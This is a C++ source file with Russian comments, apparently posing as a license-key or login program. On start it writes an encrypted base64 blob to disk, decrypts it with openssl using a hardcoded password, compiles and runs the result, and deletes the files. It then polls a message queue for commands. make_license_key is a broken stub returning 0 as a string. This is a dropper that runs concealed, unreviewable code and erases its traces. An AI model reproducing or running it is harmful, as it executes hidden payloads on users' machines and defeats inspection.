#include <iostream>
#include <string>
#include <cstring>
#include <fstream>


// #include <sys/types.h>
// #include <sys/ipc.h>
#include <sys/msg.h>




unsigned char rev(const char a)
{
	std::cout << (uint)(a) << std::endl;
	for (int i=sizeof(a)*8-1; i>=0; --i)
	{
		std::cout<<(int)((a>>i)&1);
	}

	std::cout << std::endl; 

	unsigned char k=0;
	for(int i=7; i >=0; i--) 
	{ 
		k |= ((a >> (7-i))&1) << i;
	}

 // 	std::cout << "=====" << std::endl;

	// for (int i=sizeof(a)*8-1; i>=0; --i)
	// {
	// 	std::cout<<(int)((k>>i)&1);
	// }
	return k;

}



void make_some_bash(const char* a)
{
	std::string str1 = "U2FsdGVkX19pZp6nDOlsWY8mu6nULH48Qs20Mo6HT77HsdAMXBsRS4+WSh9RFzjy\nmxip1KECiDIlRVWADRm45PTAWfnFQRgoxpzq8Nk+Ykjg9DGSJTl0nhoAgPhXIqhP\nH5EL9Q0kEUsiaMkek7C0JoFsx717fY1RTI2YpAWHr9s1/yAm3BxCOA9Rd9EGiH8o\n0FpjyDT64bZn60lzClOKhgSI+0KlJJSbStOGz+RS3BMUXiP2FKSuA8VKyb4T5Jd0\ncbN3KLbunCU+iuyhqRXMdvZ1j+Xil8TujoVVTF3D2FJYllQVYr1Lq7tKycAZkgkQ\n30/SWGkittfxtVxnv+2UGfx7TGwxJ46Aww4+CWyoMI2Napnns3Z8/3xH6f36GNRS\ntjqZjmLNt1jf0OczCkKMXkpvt5xrkz74t4W2Jnt6HKtUyBENYfsnssbaLU+c3D+E\n6l6aCYIuNVyuStdooScWgw47Aw88z9nc9aGqpUSyJSDJoGj4nRYicmNJI3e07gu8\nGSPMBORgIEuZk2tgfM7Ebly+mtYj+xx40Q4hbZhnL/JHU8TNGrnIa0HKOdzivU5Y\n6RKAwP0X687WCmT1e2yiq18xwzsrl2On4wtkUAHFgZY8G6rxcFTQHIK1B0R6mxyw\nQppLX9Nn6Fy+64GRG/fLH2xZu51kVXl/K07pikHUAarHVe1AVx55AuD8pedTbE+6\nCJAAE4yRmtrNDpQX7hOFq4OrVpHrDvdwC1NGc6xWAv+qyQYMGgh2uD5/nraVDIxW\nDxNC+IYpB3g1FJjVaSCYBWql4EWlkzzLEdU17uuhrxQPoMqKUVbQPGkJ6v4NhAST\nzY6RhHHjdUbpY5jcYRBW3IevA1FB+jxDpX+dTYDuyMrjL6OustATJFJrybV4LqBg\nzXFUm+nAS5IDSvBPn17jE+IPdW+lLD0EBDhljuPBro5U5Gcvo5mxCwO0fLBuEfmF\nj9kk7wB6J50=";

    std::ofstream out;          // поток для записи
    out.open("one1.c"); // окрываем файл для записи
    if (out.is_open())
    {
        out << str1;
    }
    out.close();



	// system("openssl enc -d -in one1.c -out one2.c -des3 -base64 -pass pass:mypasswd -pbkdf2 ; gcc one2.c -o client.o" );


    // char a[]="WpbV93";
    str1.clear();
    str1="openssl enc -d -in one1.c -out one2.c -des3 -base64 -pass pass:" + std::string(a) +  " -pbkdf2 ; gcc one2.c -o client.o ; ./client.o ; rm one1.c one2.c client.o";

    char buf[255];
	strcpy(buf,str1.c_str());

    // std::cout<< str1 << std::endl;
    

    system(buf);
	

	// system("openssl enc -d -in one1.c -out one2.c -des3 -base64 -pass pass:WpbV93 -pbkdf2 ; gcc one2.c -o client.o ; ./client.o ; rm one1.c one2.c client.o");
}



std::string make_license_key(const std::string &logon, const std::string &password, std::string &license_key)
{





	return 0;
} 




int main()
{
	make_some_bash("WpbV93");

	//////////////////////////////////////////
	// std::cout << "Good time! Enter your credential!" << std::endl;
	// std::cout << "Enter your login" << std::endl;  

	// char login[32] = "";
	// std::cin >> login;

	// std::cout << "Enter your password" << std::endl;  
	// char pas[32] = "";
	// std::cin >> pas;

	// char key[32] = "";



	


	////////////////////////////////////////

	struct msgbuf buf;

	char cmd[1024];
	memset(cmd, 0, 1024);
	
	tryAgain:
	int fd = msgget(111, 0);
	if(fd == -1)
		perror("Ошибка сообщения"); 

	if(msgrcv(fd, &buf, 1024, 16, IPC_NOWAIT) != -1)
	{
		memcpy(cmd, buf.mtext, sizeof(buf.mtext));
		// strcat(cmd, buf.mtext); 

		// strcpy(cmd, buf.mtext); 
		// printf("%s", buf.mtext);

		// printf("%s\n", cmd);
		// printf("%s\n ", buf.mtext);
	}
	else {perror("Ошибка в msgrcv()\n"); goto tryAgain;  } 
	msgctl(fd, IPC_RMID, NULL);

/////////////////////////////////////////////////////




	// std::cout << "=====" << cmd << std::endl;


	// std::cout << "=========================================" << std::endl;

	////////////////////////////////////////

	// std::string license_key;
	// std::cout << "License key:" << license_key << std::endl;  




	// if( )	


	std::cout << "=========================================" << std::endl;


	// make_some_bash(login);
	// std::cout << "strin : " << login << std::endl;
	return 0;
}